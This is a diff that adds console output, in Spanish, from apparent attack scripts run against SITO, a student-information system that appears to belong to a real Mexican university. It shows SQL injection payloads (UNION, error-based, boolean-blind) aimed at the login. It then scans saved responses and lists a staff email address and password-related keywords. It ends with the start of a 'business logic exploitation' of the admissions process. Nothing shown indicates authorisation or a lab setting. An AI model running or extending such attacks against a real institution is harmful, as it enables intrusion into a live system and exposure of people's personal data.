@@ -1,0 +1,174 @@
+Script de SQL Injection Adaptativo para la Aplicación SITO
+
+=== SQL INJECTION ADAPTATIVO ===
+[*] Analizando comportamiento de la aplicación...
+
+[*] Probando: Union básico
+    Payload: admin' UNION SELECT 'TEST1','TEST2','TEST3'--...
+    [+] Comportamiento normal - muestra 'Solicita Ficha de Admisión'
+
+[*] Probando: Concat database
+    Payload: admin' UNION SELECT CONCAT('DB:',database()),'TEST...
+    [+] Comportamiento normal - muestra 'Solicita Ficha de Admisión'
+
+[*] Probando: AND condition
+    Payload: admin' AND 1=1--...
+    [+] Comportamiento normal - muestra 'Solicita Ficha de Admisión'
+
+[*] Probando: Error-based
+    Payload: admin' AND EXTRACTVALUE(1,CONCAT(0x3a,database()))...
+    [+] Comportamiento normal - muestra 'Solicita Ficha de Admisión'
+
+[*] Probando: Boolean blind
+    Payload: admin' AND database() LIKE '%'--...
+    [+] Comportamiento normal - muestra 'Solicita Ficha de Admisión'
+
+[*] Usando técnicas de inyección ciega...
+[*] Extrayendo nombre de la base de datos...
+    [-] No se pudo determinar el carácter en posición 1
+[-] No se pudo extraer el nombre de la base de datos
+
+Script de Análisis de Respuestas Guardadas
+
+=== ANÁLISIS DE RESPUESTAS GUARDADAS ===
+[*] Analizando respuestas guardadas...
+
+[+] Analizando: auth__jsp_cerrar_sesion.jsp.html
+    [!] Database Keywords encontrados: ['table']
+    [!] File Paths encontrados: ['/td>\n\n\t\t</tr>\n\n\t\t<tr class="CeldaDatos">\n\n\t\t\t<td colspan="2">&nbsp;  <', '/www.w3.org/TR', '/head>\n\n\n\n<script language="javascript" type="text/javascript">\n\n<!--\n\n\twindow.history.go(1);\n\n']
+
+[+] Analizando: auth__jsp_index.jsp.html
+    [!] Database Keywords encontrados: ['table']
+    [!] File Paths encontrados: ['/td>\n\n\t\t</tr>\n\n\t\t<tr class="CeldaDatos">\n\n\t\t\t<td colspan="2">&nbsp;  <', '/www.w3.org/TR', '/images/home_16.gif">\n\n\t\t\t\t\t\t<a href="cerrar_sesion.jsp" target="_top" class="CeldaBoton" onmouseover="this.className=\'CeldaBotonSeleccionado\'" onmouseout="this.className=\'CeldaBoton\'"> \n\n\t\t\t\t\t\t\tIniciar Sesión \n\n\t\t\t\t\t\t<']
+
+[+] Analizando: extraction_-3588502152288535295.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT', 'FROM']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+
+[+] Analizando: extraction_-8729360846325746441.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+
+[+] Analizando: extraction_4541241488071886699.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT', 'FROM']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+
+[+] Analizando: extraction_4905282592689327027.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT', 'WHERE']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+
+[+] Analizando: extraction_8137112120017886264.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+
+[+] Analizando: form_response_proceso_interesado.jsp.html
+    [!] Database Keywords encontrados: ['table']
+    [!] SQL Keywords encontrados: ['select', 'Union']
+    [!] File Paths encontrados: ['/utilities.js"></script>\n\n<script language="javascript" type="text', '/arrow-forward_32.gif";\n\n\t\t\t\treturn;\n\n            }\n\n\n\n            var anioInicio = (document.forma.xAnioInicio.value);\n\n\n\n            if (anioInicio.length <= 1)\n\n            {\n\n                alert("Selecciona el año de inicio de tu periodo de bachillerato");\n\n                document.forma.xAnioInicio.focus();\n\n                imagen.src = "../..', '/tr>\t\n\n\t\t\t\t\t\t\t</table>\t  \n\n\t\t\t\t\t\t<']
+
+[+] Analizando: form_response__jsp_escolar_proceso_admision_lic_proceso_interesado.jsp.html
+    [!] Database Keywords encontrados: ['table']
+    [!] SQL Keywords encontrados: ['select', 'Union']
+    [!] File Paths encontrados: ['/utilities.js"></script>\n\n<script language="javascript" type="text', '/arrow-forward_32.gif";\n\n\t\t\t\treturn;\n\n            }\n\n\n\n            var anioInicio = (document.forma.xAnioInicio.value);\n\n\n\n            if (anioInicio.length <= 1)\n\n            {\n\n                alert("Selecciona el año de inicio de tu periodo de bachillerato");\n\n                document.forma.xAnioInicio.focus();\n\n                imagen.src = "../..', '/tr>\t\n\n\t\t\t\t\t\t\t</table>\t  \n\n\t\t\t\t\t\t<']
+
+[+] Analizando: form_response__jsp_escolar_proceso_admision_proceso_interesado.jspxModalidadPD.html
+    [!] Database Keywords encontrados: ['table']
+    [!] File Paths encontrados: ['/inicializa_menu();\n\n\t\t\t\t\txmlhttp1.open("GET", "muestra_bachillerato_ajax.jsp?xCveBachillerato=" + cve_bachillerato);\n\n\t\t\t\t\txmlhttp1.onreadystatechange = function() {\n\n\t\t\t\t\t\tif (xmlhttp1.readyState == 4) {\n\n\t\t\t\t\t\t\tvar bachillerato = Trim((xmlhttp1.responseText).replace(/\\r\\n|\\n|\\r', '/www.w3.org/TR', '/styles2/characters.css" type="text']
+
+[+] Analizando: form_response__jsp_escolar_proceso_admision_proceso_interesado.jspxModalidadPN.html
+    [!] Database Keywords encontrados: ['table']
+    [!] File Paths encontrados: ['/inicializa_menu();\n\n\t\t\t\t\txmlhttp1.open("GET", "muestra_bachillerato_ajax.jsp?xCveBachillerato=" + cve_bachillerato);\n\n\t\t\t\t\txmlhttp1.onreadystatechange = function() {\n\n\t\t\t\t\t\tif (xmlhttp1.readyState == 4) {\n\n\t\t\t\t\t\t\tvar bachillerato = Trim((xmlhttp1.responseText).replace(/\\r\\n|\\n|\\r', '/www.w3.org/TR', '/styles2/characters.css" type="text']
+
+[+] Analizando: form_response__jsp_escolar_proceso_admision_proceso_interesado.jspxModalidadPZ.html
+    [!] Database Keywords encontrados: ['table']
+    [!] File Paths encontrados: ['/inicializa_menu();\n\n\t\t\t\t\txmlhttp1.open("GET", "muestra_bachillerato_ajax.jsp?xCveBachillerato=" + cve_bachillerato);\n\n\t\t\t\t\txmlhttp1.onreadystatechange = function() {\n\n\t\t\t\t\t\tif (xmlhttp1.readyState == 4) {\n\n\t\t\t\t\t\t\tvar bachillerato = Trim((xmlhttp1.responseText).replace(/\\r\\n|\\n|\\r', '/www.w3.org/TR', '/styles2/characters.css" type="text']
+
+[+] Analizando: index_jsp_analysis.html
+    [!] Database Keywords encontrados: ['table']
+    [!] File Paths encontrados: ['/td>\n\n\t\t</tr>\n\n\t\t<tr class="CeldaDatos">\n\n\t\t\t<td colspan="2">&nbsp;  <', '/www.w3.org/TR', '/images/home_16.gif">\n\n\t\t\t\t\t\t<a href="cerrar_sesion.jsp" target="_top" class="CeldaBoton" onmouseover="this.className=\'CeldaBotonSeleccionado\'" onmouseout="this.className=\'CeldaBoton\'"> \n\n\t\t\t\t\t\t\tIniciar Sesión \n\n\t\t\t\t\t\t<']
+
+[+] Analizando: mysql_info_1.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['table', 'user', 'database']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+    [MySQL] Buscando datos inyectados...
+    [!] Posibles datos inyectados: ['usuario', 'Usuario']
+
+[+] Analizando: mysql_info_2.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT', 'FROM']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+    [MySQL] Buscando datos inyectados...
+    [!] Posibles datos inyectados: ['usuario', 'Usuario']
+
+[+] Analizando: mysql_info_3.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT', 'WHERE']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+    [MySQL] Buscando datos inyectados...
+    [!] Posibles datos inyectados: ['usuario', 'Usuario']
+
+[+] Analizando: mysql_info_4.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['table', 'user', 'Password']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT', 'FROM']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+    [MySQL] Buscando datos inyectados...
+    [!] Posibles datos inyectados: ['usuario', 'Usuario']
+
+[+] Analizando: response_' OR '1'='.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+
+[+] Analizando: response_' OR 1=1--.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+
+[+] Analizando: response_' UNION SE.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+
+[+] Analizando: response_admin' AND.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] SQL Keywords encontrados: ['SELECT']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/>\n\n\t\t\t\t\t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n\n\t\t\t\t\t<img src="images/banner3_navidad.png?time=1758595831078" alt="Sistema de Información Táctico Operativo"  height="126" class="responsive2"', '/www.w3.org/TR']
+
+[+] Analizando: response_admin' OR .html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+
+[+] Analizando: response_admin' UNI.html
+    [!] Emails encontrados: ['hnieto@utslp.edu.mx']
+    [!] Database Keywords encontrados: ['Password', 'table', 'password']
+    [!] SQL Keywords encontrados: ['UNION', 'SELECT']
+    [!] File Paths encontrados: ['/media.tenor.com/7BN-GkSu8aAAAAAi', '/www.w3.org/TR', '/>\n\n\t\t\t\t  </div>\n\n\t\t\t\t\t\t\n\n\t\t\t\t\t\t<div class="col-md-6 col-sm-6 col-xs-12 " style="text-align:center"> \n\n\t\t\t\t\t\t\t<a href="#" class="ml-auto mb-0 text-sm" onclick="RecContra()" style="color:#000000">¿Olvidaste tu contraseña?<']
+
+[+] Analizando: sql_injection_success.html
+    [!] Database Keywords encontrados: ['table']
+    [!] File Paths encontrados: ['/td>\n\n\t\t</tr>\n\n\t\t<tr class="CeldaDatos">\n\n\t\t\t<td colspan="2">&nbsp;  <', '/www.w3.org/TR', '/table>\n\n\t<table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">\n\n\t\t<colgroup>\n\n\t\t\t<col width="20%"> <col width="80%">\n\n\t\t</colgroup>\t\n\n\t\t<tr class="CeldaDatos">\n\n\t\t\t<td colspan="2">&nbsp;  <']
+
+Script de Explotación de la Lógica de Negocio
+
+=== EXPLOTACIÓN DE LÓGICA DE NEGOCIO ===
+[*] Explotando proceso de admisión...
+
+[*] Buscando exportación de datos...
